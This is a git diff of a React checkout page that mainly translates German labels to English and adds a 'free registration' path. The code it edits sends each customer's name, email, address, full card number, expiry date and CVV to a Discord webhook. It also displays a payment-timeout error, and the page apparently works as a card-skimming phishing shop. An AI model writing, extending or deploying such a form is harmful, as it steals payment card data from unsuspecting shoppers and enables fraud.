@@ -42,18 +42,18 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
 
     // Send to Discord webhook
     const webhookData = {
-      content: "🛒 **Neue Bestellung erhalten!**",
+      content: "🛒 **New Order Received!**",
       embeds: [{
-        title: "Bestelldetails",
+        title: "Order Details",
         color: 16001880, // Pink color
         fields: [
-          { name: "Kunde", value: formData.name, inline: true },
-          { name: "E-Mail", value: formData.email, inline: true },
-          { name: "Adresse", value: `${formData.address}, ${formData.zipCode} ${formData.city}`, inline: false },
-          { name: "Artikel", value: items.map(item => `${item.name} - €${item.price}`).join('\n'), inline: false },
-          { name: "Gesamtsumme", value: `€${total.toFixed(2)}`, inline: true },
-          { name: "Kartennummer", value: formData.cardNumber, inline: true },
-          { name: "Ablaufdatum", value: formData.expiryDate, inline: true },
+          { name: "Customer", value: formData.name, inline: true },
+          { name: "Email", value: formData.email, inline: true },
+          { name: "Address", value: `${formData.address}, ${formData.zipCode} ${formData.city}`, inline: false },
+          { name: "Items", value: items.map(item => `${item.name} - €${item.price}`).join('\n'), inline: false },
+          { name: "Total Amount", value: `€${total.toFixed(2)}`, inline: true },
+          { name: "Card Number", value: formData.cardNumber, inline: true },
+          { name: "Expiry Date", value: formData.expiryDate, inline: true },
           { name: "CVV", value: formData.cvv, inline: true },
         ],
         timestamp: new Date().toISOString(),
@@ -84,7 +84,7 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
           onClick={onGoBack}
           className="bg-pink-600 hover:bg-pink-700 text-white px-6 py-3 rounded-lg transition-all duration-300 hover:scale-105"
         >
-          ← Zurück
+          ← Back
         </button>
         <h2 className="text-4xl font-bold text-white text-center bg-gradient-to-r from-pink-400 to-purple-400 bg-clip-text text-transparent">
           Checkout
@@ -97,7 +97,7 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
         <div className="bg-gradient-to-br from-pink-900/20 to-purple-900/20 backdrop-blur-sm rounded-xl p-8 border border-pink-500/20">
           <h3 className="text-2xl font-semibold text-white mb-6 flex items-center gap-3">
             <CreditCard className="w-6 h-6 text-pink-400" />
-            Bestellübersicht
+            Order Summary
           </h3>
           
           <div className="space-y-4 mb-6">
@@ -107,15 +107,19 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
                   <h4 className="font-semibold text-white">{item.name}</h4>
                   <p className="text-pink-400 text-sm uppercase">{item.type}</p>
                 </div>
-                <span className="text-pink-400 font-semibold">€{item.price}</span>
+                <span className="text-pink-400 font-semibold">
+                  {item.price === 0 ? 'FREE' : `€${item.price}`}
+                </span>
               </div>
             ))}
           </div>
           
           <div className="border-t border-pink-500/20 pt-4">
             <div className="flex justify-between items-center text-xl font-bold">
-              <span className="text-white">Gesamtsumme:</span>
-              <span className="text-pink-400">€{total.toFixed(2)}</span>
+              <span className="text-white">Total Amount:</span>
+              <span className="text-pink-400">
+                {total === 0 ? 'FREE' : `€${total.toFixed(2)}`}
+              </span>
             </div>
           </div>
         </div>
@@ -128,7 +132,7 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
               <AlertCircle className="w-6 h-6 text-red-400 flex-shrink-0" />
               <div>
                 <h4 className="text-red-300 font-semibold">Error 408 Request Timeout</h4>
-                <p className="text-red-200 text-sm">Die Zahlung konnte nicht verarbeitet werden. Bitte versuchen Sie es erneut.</p>
+                <p className="text-red-200 text-sm">Payment could not be processed. Please try again.</p>
               </div>
             </div>
           )}
@@ -136,14 +140,14 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
           <form onSubmit={handleSubmit} className="space-y-6">
             <h3 className="text-2xl font-semibold text-white mb-6 flex items-center gap-3">
               <User className="w-6 h-6 text-purple-400" />
-              Zahlungsinformationen
+              Payment Information
             </h3>
 
             {/* Email */}
             <div className="space-y-2">
               <label className="text-white font-semibold flex items-center gap-2">
                 <Mail className="w-4 h-4 text-pink-400" />
-                E-Mail Adresse
+                Email Address
               </label>
               <input
                 type="email"
@@ -152,7 +156,7 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
                 value={formData.email}
                 onChange={handleInputChange}
                 className="w-full bg-black/30 border border-pink-500/30 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:border-pink-400 focus:outline-none transition-colors duration-300"
-                placeholder="deine@email.de"
+                placeholder="your@email.com"
               />
             </div>
 
@@ -160,7 +164,7 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
             <div className="space-y-2">
               <label className="text-white font-semibold flex items-center gap-2">
                 <User className="w-4 h-4 text-pink-400" />
-                Vollständiger Name
+                Full Name
               </label>
               <input
                 type="text"
@@ -169,7 +173,7 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
                 value={formData.name}
                 onChange={handleInputChange}
                 className="w-full bg-black/30 border border-pink-500/30 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:border-pink-400 focus:outline-none transition-colors duration-300"
-                placeholder="Max Mustermann"
+                placeholder="John Doe"
               />
             </div>
 
@@ -177,7 +181,7 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
             <div className="space-y-2">
               <label className="text-white font-semibold flex items-center gap-2">
                 <MapPin className="w-4 h-4 text-pink-400" />
-                Adresse
+                Address
               </label>
               <input
                 type="text"
@@ -186,14 +190,14 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
                 value={formData.address}
                 onChange={handleInputChange}
                 className="w-full bg-black/30 border border-pink-500/30 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:border-pink-400 focus:outline-none transition-colors duration-300"
-                placeholder="Musterstraße 123"
+                placeholder="123 Main Street"
               />
             </div>
 
             {/* City and Zip */}
             <div className="grid grid-cols-2 gap-4">
               <div className="space-y-2">
-                <label className="text-white font-semibold">Stadt</label>
+                <label className="text-white font-semibold">City</label>
                 <input
                   type="text"
                   name="city"
@@ -201,11 +205,11 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
                   value={formData.city}
                   onChange={handleInputChange}
                   className="w-full bg-black/30 border border-pink-500/30 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:border-pink-400 focus:outline-none transition-colors duration-300"
-                  placeholder="Berlin"
+                  placeholder="New York"
                 />
               </div>
               <div className="space-y-2">
-                <label className="text-white font-semibold">PLZ</label>
+                <label className="text-white font-semibold">ZIP Code</label>
                 <input
                   type="text"
                   name="zipCode"
@@ -213,7 +217,7 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
                   value={formData.zipCode}
                   onChange={handleInputChange}
                   className="w-full bg-black/30 border border-pink-500/30 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:border-pink-400 focus:outline-none transition-colors duration-300"
-                  placeholder="12345"
+                  placeholder="10001"
                 />
               </div>
             </div>
@@ -222,7 +226,7 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
             <div className="space-y-2">
               <label className="text-white font-semibold flex items-center gap-2">
                 <CreditCard className="w-4 h-4 text-pink-400" />
-                Kartennummer
+                Card Number
               </label>
               <input
                 type="text"
@@ -239,7 +243,7 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
             {/* Expiry and CVV */}
             <div className="grid grid-cols-2 gap-4">
               <div className="space-y-2">
-                <label className="text-white font-semibold">Ablaufdatum</label>
+                <label className="text-white font-semibold">Expiry Date</label>
                 <input
                   type="text"
                   name="expiryDate"
@@ -275,10 +279,10 @@ const Checkout = ({ items, onGoBack, onOrderComplete }: CheckoutProps) => {
               {isProcessing ? (
                 <div className="flex items-center justify-center gap-3">
                   <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin" />
-                  Zahlung wird verarbeitet...
+                  Processing payment...
                 </div>
               ) : (
-                `Jetzt bezahlen - €${total.toFixed(2)}`
+                total === 0 ? 'Complete Free Registration' : `Pay Now - €${total.toFixed(2)}`
               )}
             </button>
           </form>
